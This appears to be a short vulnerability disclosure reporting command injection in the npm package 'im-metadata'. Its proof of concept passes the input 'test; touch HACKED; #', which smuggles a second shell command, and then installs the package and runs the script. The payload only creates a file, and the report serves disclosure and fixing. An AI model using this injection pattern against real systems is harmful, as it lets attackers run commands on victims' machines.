# Overview

This vulnerability allows to execute `arbitrary commands remotely inside the victim's PC`

The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check.

# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
var metadata = require("im-metadata");
metadata("test; touch HACKED; #", {}, function () {});
```

1. Check there aren't files called `HACKED`
1. Execute the following commands in another terminal:

```bash
npm i im-metadata # Install affected module
node poc.js #  Run the PoC
```

1. Recheck the files: now `HACKED` has been created :)
